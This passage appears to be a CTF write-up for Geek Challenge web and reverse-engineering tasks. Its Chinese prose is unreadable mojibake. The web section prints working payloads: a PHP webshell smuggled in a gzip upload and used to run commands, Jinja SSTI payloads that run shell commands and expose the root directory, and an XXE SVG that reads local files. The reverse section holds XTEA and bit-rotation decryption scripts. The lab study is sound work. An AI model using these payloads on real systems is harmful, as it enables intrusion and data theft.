class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>019a4236-ff28-71b9-b009-26b2d6f92096.geek.ctfplus.cn</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>8451</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryF68h0SF0JVXCdFUF</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://019a4236-ff28-71b9-b009-26b2d6f92096.geek.ctfplus.cn</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://019a4236-ff28-71b9-b009-26b2d6f92096.geek.ctfplus.cn/upload.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7,zh-TW;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>_clck=bi6pt4%5E2%5Eg0l%5E0%5E2007; PHPSESSID=daae49914163fee76e5498421cd5b9df</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryF68h0SF0JVXCdFUF</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;shell.gz&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/x-gzip</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">ã€gzipæ•°æ®ã€‘ï¼ˆ<span class="number">4096</span>ä¸ªxï¼‰<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span>ï¼ˆ<span class="number">4096</span>ä¸ªxï¼‰</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPLOAD_OK:1762049642_shell.gz</span><br></pre></td></tr></table></figure><p>æœ€åè®¿é—®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?f=1762049642_shell.gz&amp;0=cat%20/flag/flag.txt</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagã€‚</p><p>â€‹</p><h3 id="è·¯åœ¨è„šä¸‹"><a href="#è·¯åœ¨è„šä¸‹" class="headerlink" title="è·¯åœ¨è„šä¸‹"></a>è·¯åœ¨è„šä¸‹</h3><blockquote><p>æœ‰äººè¯´äº‹åˆ°å¦‚ä»Šå·²ç»æ— è·¯å¯èµ°ï¼Œå²‚ä¸é—»å¤©æ— ç»äººä¹‹è·¯ï¼Œåªè¦æˆ‘æƒ³èµ°ï¼Œâ€œè·¯â€ï¼Œå°±åœ¨è„šä¸‹ï¼</p></blockquote><p>åˆ©ç”¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;env&gt;/tmp/1.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><p><a target="_blank" rel="noopener" href="https://asal1n.github.io/2024/10/18/python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;&amp;%E5%86%85%E5%AD%98%E9%A9%AC/index.html">https://asal1n.github.io/2024/10/18/python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;&amp;%E5%86%85%E5%AD%98%E9%A9%AC/index.html</a></p><p>å°†æ ¹ç›®å½•è®¾ç½®ä¸ºflaské™æ€æ–‡ä»¶è·¯å¾„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;x.__init__.__globals__.__getitem__(&#x27;__builtins__&#x27;).__getitem__(&#x27;exec&#x27;)(&quot;setattr(__import__(&#x27;sys&#x27;).modules.__getitem__(&#x27;__main__&#x27;).__dict__.__getitem__(&#x27;app&#x27;),&#x27;_static_folder&#x27;,&#x27;/&#x27;)&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—® /static/tmp/1.txtï¼Œå¾—åˆ°flag</p><p>â€‹</p><h3 id="Image-Viewer"><a href="#Image-Viewer" class="headerlink" title="Image Viewer"></a>Image Viewer</h3><blockquote><p>å®‰å…¨çš„åœ¨çº¿å›¾ç‰‡é¢„è§ˆç½‘ç«™</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/render&quot;</span> <span class="attr">class</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">accept</span>=<span class="string">&quot;.svg,image/svg+xml,.png,.jpg,.jpeg,.gif,image/*&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;btn primary&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Render&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šä¼ è·¯å¾„æ˜¯ /renderï¼ŒæœåŠ¡ç«¯ä¼šå¤„ç†ä¸Šä¼ çš„å›¾ç‰‡å¹¶æ¸²æŸ“ï¼ˆrenderï¼‰å‡ºæ¥ã€‚</p><p>SVG æ˜¯ å¯åµŒå…¥è„šæœ¬çš„ XML æ–‡ä»¶ï¼Œå¯åˆ©ç”¨ SVG XSSã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/render</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>geek.ctfplus.cn:32275</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>353</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://geek.ctfplus.cn:32275</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryairmzGFMIwdRYJE5</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://geek.ctfplus.cn:32275/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7,zh-TW;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>_clck=3r8bd6%5E2%5Eg0p%5E0%5E2116</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-xml">------WebKitFormBoundaryairmzGFMIwdRYJE5</span></span><br><span class="line"><span class="language-xml">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;111&quot;</span></span><br><span class="line"><span class="language-xml">Content-Type: image/svg</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span> &gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">------WebKitFormBoundaryairmzGFMIwdRYJE5--</span></span><br></pre></td></tr></table></figure><p><code>SYC&#123;Go0d_SVG_worK&#125;</code></p><p>â€‹</p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h3><blockquote><p>æˆ‘çš„stdioå‘¢ï¼Œç®—äº†ï¼Œè¿˜æ˜¯è‡ªå·±å†™å§</p></blockquote><p>IDAè¯†åˆ«ä¸ºMach-O fileï¼Œä»£ç é€»è¾‘ï¼š</p><p>è¾“å…¥å¤„ç†ï¼šç”¨æˆ·è¾“å…¥å­—ç¬¦ä¸²ï¼Œé€šè¿‡è‡ªå®šä¹‰ scanf è¯»å–å¹¶åŠ å¯†ã€‚</p><p>åŠ å¯†æµç¨‹ï¼šè¾“å…¥å­—ç¬¦ä¸²ç»è¿‡å¼‚æˆ–ï¼ˆ^ 0x5Aï¼‰å¤„ç†ã€‚åŠ å¯†å‡½æ•° enc è¿›è¡Œå¡«å……å’Œåˆ†å—åŠ å¯†ï¼ˆæ¯å—8å­—èŠ‚ï¼Œè°ƒç”¨ enc_blockï¼‰ã€‚enc_block ä½¿ç”¨XTEAç®—æ³•è¿›è¡ŒåŠ å¯†ã€‚</p><p>éªŒè¯ï¼šåŠ å¯†åçš„æ•°æ®ç»è¿‡Base64ç¼–ç ã€‚ä¸é¢„å®šä¹‰çš„å¯†æ–‡ï¼ˆ__dstï¼‰æ¯”è¾ƒï¼Œåˆ¤æ–­è¾“å…¥æ˜¯å¦æ­£ç¡®ã€‚</p><p>æå–å¯†æ–‡ï¼Œè§£XTEAï¼ˆæ³¨æ„æ˜¯å¤§ç«¯åºï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    x = delta * <span class="number">32</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (x + k[(x &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (x + k[x &amp; <span class="number">3</span>])</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">list</span>(b64decode(<span class="string">&#x27;vBzX30Koxl3HpDaYaFJKhyB/1ckuVCnc4wZhrwUWeNuZkAxr+Qn5UaYbpvymmCrk&#x27;</span>))</span><br><span class="line">c = [k ^ <span class="number">0x5A</span> <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"></span><br><span class="line">k = <span class="string">b&#x27;geek2025reverse!&#x27;</span></span><br><span class="line">key = [bytes_to_long(k[<span class="number">4</span>*i:<span class="number">4</span>*(i+<span class="number">1</span>)]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(k)//<span class="number">4</span>)]</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line">encrypted = [bytes_to_long(<span class="built_in">bytes</span>(c[<span class="number">4</span>*i:<span class="number">4</span>*(i+<span class="number">1</span>)])) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">4</span>)]</span><br><span class="line"><span class="built_in">print</span>(encrypted)</span><br><span class="line"></span><br><span class="line">decrypted = []</span><br><span class="line">final = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted)//<span class="number">2</span>):</span><br><span class="line">    now = decrypt(encrypted[<span class="number">2</span>*i:<span class="number">2</span>*(i+<span class="number">1</span>)], key)</span><br><span class="line">    decrypted += now</span><br><span class="line">    final += long_to_bytes(now[<span class="number">0</span>]) + long_to_bytes(now[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(final)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;St4nd4rd_Funct10n_N0t_4lw4ys_St4nd4rd&#125;\x06\x06\x06\x06\x06\x06&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="ez-pyyy"><a href="#ez-pyyy" class="headerlink" title="ez_pyyy"></a>ez_pyyy</h3><blockquote><p>å¤ªå¥½äº†æ˜¯pycæˆ‘ä»¬æœ‰æ•‘äº†</p></blockquote><p>PyLingualåç¼–è¯‘pycï¼Œå¾—åˆ°æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">cipher = [<span class="number">48</span>, <span class="number">55</span>, <span class="number">57</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">55</span>, <span class="number">53</span>, <span class="number">50</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">48</span>, <span class="number">55</span>, <span class="number">101</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">50</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">48</span>, <span class="number">55</span>, <span class="number">53</span>, <span class="number">55</span>, <span class="number">55</span>, <span class="number">55</span>, <span class="number">50</span>, <span class="number">54</span>, <span class="number">53</span>, <span class="number">55</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">55</span>, <span class="number">55</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">98</span>, <span class="number">55</span>, <span class="number">97</span>, <span class="number">54</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">56</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">52</span>, <span class="number">99</span>, <span class="number">54</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">54</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_to_hex_bytes</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> s.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">data: <span class="built_in">bytes</span>, key: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([b ^ key <span class="keyword">for</span> b <span class="keyword">in</span> data])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">en3</span>(<span class="params">b: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> b &lt;&lt; <span class="number">4</span> &amp; <span class="number">240</span> | b &gt;&gt; <span class="number">4</span> &amp; <span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">en33</span>(<span class="params">data: <span class="built_in">bytes</span>, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ•´ä½“ bitstream å¾ªç¯å·¦ç§» n ä½&quot;&quot;&quot;</span></span><br><span class="line">    bit_len = <span class="built_in">len</span>(data) * <span class="number">8</span></span><br><span class="line">    n = n % bit_len</span><br><span class="line">    val = <span class="built_in">int</span>.from_bytes(data, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    val = (val &lt;&lt; n | val &gt;&gt; bit_len - n) &amp; (<span class="number">1</span> &lt;&lt; bit_len) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> val.to_bytes(<span class="built_in">len</span>(data), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    data = str_to_hex_bytes(flag)</span><br><span class="line">    data = enc(data, <span class="number">17</span>)</span><br><span class="line">    data = <span class="built_in">bytes</span>([en3(b) <span class="keyword">for</span> b <span class="keyword">in</span> data])</span><br><span class="line">    data = data[::-<span class="number">1</span>]</span><br><span class="line">    data = en33(data, <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">if</span> data.<span class="built_in">hex</span>() == cipher:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Correct! &#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Wrongï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼&#x27;</span>)</span><br></pre></td></tr></table></figure><p>åŠ å¯†é€»è¾‘æ˜¯ä¸€äº›ä½è¿ç®—ï¼Œæ±‚è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cipher_codes = [<span class="number">48</span>,<span class="number">55</span>,<span class="number">57</span>,<span class="number">50</span>,<span class="number">53</span>,<span class="number">55</span>,<span class="number">53</span>,<span class="number">50</span>,<span class="number">52</span>,<span class="number">50</span>,<span class="number">48</span>,<span class="number">55</span>,<span class="number">101</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">50</span>,<span class="number">52</span>,<span class="number">50</span>,<span class="number">52</span>,<span class="number">50</span>,<span class="number">48</span>,<span class="number">55</span>,<span class="number">53</span>,<span class="number">55</span>,<span class="number">55</span>,<span class="number">55</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">53</span>,<span class="number">55</span>,<span class="number">54</span>,<span class="number">55</span>,<span class="number">55</span>,<span class="number">55</span>,<span class="number">53</span>,<span class="number">54</span>,<span class="number">98</span>,<span class="number">55</span>,<span class="number">97</span>,<span class="number">54</span>,<span class="number">50</span>,<span class="number">53</span>,<span class="number">56</span>,<span class="number">52</span>,<span class="number">50</span>,<span class="number">52</span>,<span class="number">99</span>,<span class="number">54</span>,<span class="number">50</span>,<span class="number">50</span>,<span class="number">52</span>,<span class="number">50</span>,<span class="number">50</span>,<span class="number">54</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">en3</span>(<span class="params">b: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> (b &lt;&lt; <span class="number">4</span> &amp; <span class="number">0xF0</span>) | (b &gt;&gt; <span class="number">4</span> &amp; <span class="number">0x0F</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror_bytes</span>(<span class="params">data: <span class="built_in">bytes</span>, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    bit_len = <span class="built_in">len</span>(data) * <span class="number">8</span></span><br><span class="line">    n = n % bit_len</span><br><span class="line">    val = <span class="built_in">int</span>.from_bytes(data, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    val = (val &gt;&gt; n) | ((val &lt;&lt; (bit_len - n)) &amp; ((<span class="number">1</span> &lt;&lt; bit_len) - <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> val.to_bytes(<span class="built_in">len</span>(data), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cipher_hex = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> cipher_codes)</span><br><span class="line">cipher_bytes = <span class="built_in">bytes</span>.fromhex(cipher_hex)</span><br><span class="line"></span><br><span class="line">data = ror_bytes(cipher_bytes, <span class="number">32</span>)</span><br><span class="line">data = data[::-<span class="number">1</span>]</span><br><span class="line">data = <span class="built_in">bytes</span>(en3(b) <span class="keyword">for</span> b <span class="keyword">in</span> data)</span><br><span class="line">data = <span class="built_in">bytes</span>(b ^ <span class="number">17</span> <span class="keyword">for</span> b <span class="keyword">in</span> data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;jtfgdsfda554_a54d8as53&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="only-flower"><a href="#only-flower" class="headerlink" title="only_flower"></a>only_flower</h3><blockquote><p>å»å¹´çš„èŠ±æµ·åªå‰©ä¸‹ä¸€æœµèŠ±äº†</p></blockquote><p>mainå‡½æ•°æœ‰èŠ±æŒ‡ä»¤ï¼ŒåŸºæœ¬éƒ½æ˜¯jmp short near ptr xxx è¿™æ ·çš„èŠ±æŒ‡ä»¤ï¼Œnopæ‰ã€‚</p><p>ç›¸ä¼¼çš„checkcheckå’Œencryptå‡½æ•°éƒ½æœ‰èŠ±ï¼Œå…¨éƒ¨nopæ‰ï¼Œè¿˜åŸä¼ªç ã€‚</p><p>ä»£ç é€»è¾‘ï¼š</p><p>è¾“å…¥flagï¼Œæ£€æŸ¥æ ¼å¼ï¼Œä»¥ â€œSYC{â€œ å¼€å¤´ï¼Œä»¥ â€œ}â€ ç»“å°¾ï¼Œé•¿åº¦ 28ï¼ŒåŠ å¯†è¾“å…¥ï¼Œå’Œ CIPHER æ¯”è¾ƒã€‚</p><p>å¯¹rolç§»ä½åŠ å¯†é€†å‘ï¼Œæ±‚è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">KEY = <span class="string">b&quot;GEEK2025&quot;</span></span><br><span class="line">CIPHER = [<span class="number">0x0A</span>, <span class="number">0x84</span>, <span class="number">0xC2</span>, <span class="number">0x84</span>, <span class="number">0x51</span>, <span class="number">0x48</span>, <span class="number">0x5F</span>, <span class="number">0xF2</span>, <span class="number">0x9E</span>, <span class="number">0x8D</span>,</span><br><span class="line">  <span class="number">0xD0</span>, <span class="number">0x84</span>, <span class="number">0x75</span>, <span class="number">0x67</span>, <span class="number">0x73</span>, <span class="number">0x8F</span>, <span class="number">0xCA</span>, <span class="number">0x57</span>, <span class="number">0xD7</span>, <span class="number">0xE6</span>,</span><br><span class="line">  <span class="number">0x14</span>, <span class="number">0x6E</span>, <span class="number">0x77</span>, <span class="number">0xE2</span>, <span class="number">0x29</span>, <span class="number">0xFE</span>, <span class="number">0xDF</span>, <span class="number">0xCC</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rol8</span>(<span class="params">v,n</span>):</span><br><span class="line">    n = n &amp;<span class="number">7</span></span><br><span class="line">    <span class="keyword">return</span> ((v &lt;&lt; n) &amp; <span class="number">0xFF</span>) | (v &gt;&gt; (<span class="number">8</span>-n))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror8</span>(<span class="params">v,n</span>):</span><br><span class="line">    n = n &amp;<span class="number">7</span></span><br><span class="line">    <span class="keyword">return</span> ((v &gt;&gt; n) | ((v &lt;&lt; (<span class="number">8</span>-n)) &amp; <span class="number">0xFF</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">out = CIPHER</span><br><span class="line">key = KEY</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(out):</span><br><span class="line">    k = key[i % <span class="built_in">len</span>(key)]</span><br><span class="line">    n = k &amp; <span class="number">7</span></span><br><span class="line">    t = (c - i) &amp; <span class="number">0xFF</span></span><br><span class="line">    x = 